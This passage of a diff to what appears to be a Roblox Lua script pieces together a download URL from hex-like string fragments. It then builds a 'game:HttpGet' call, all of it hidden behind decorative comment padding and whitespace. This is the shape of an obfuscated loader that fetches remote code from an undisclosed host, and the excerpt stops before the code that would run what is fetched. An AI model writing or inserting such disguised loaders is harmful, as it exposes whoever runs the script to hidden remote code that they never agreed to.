@@ -102,9 +102,9 @@ Discord: discord.gg/jUuYn6gRjk
                   h='bb445d25747ea081f'                              
                  i='17accc395e65f11843c'                                         
                 j='2bcdb91468b5efd296ac1';  
-	     n='0/download';          --=                      
-              k=a..b..c..d..e..f..g..h;  --=  
-	   m=i..j..n;		  --= 
+	     	   n='0/download';          --=                      
+              k=a..b..c..d..e..f..g..h;  --=                                                        
+		     m=i..j..n;		          --=                                     
             local x=[[game:Htt]];          --=                           
            local y=[[pGet("]]..k..m;        --=                          
           local z=[[")]];local fun;         --[]=                         
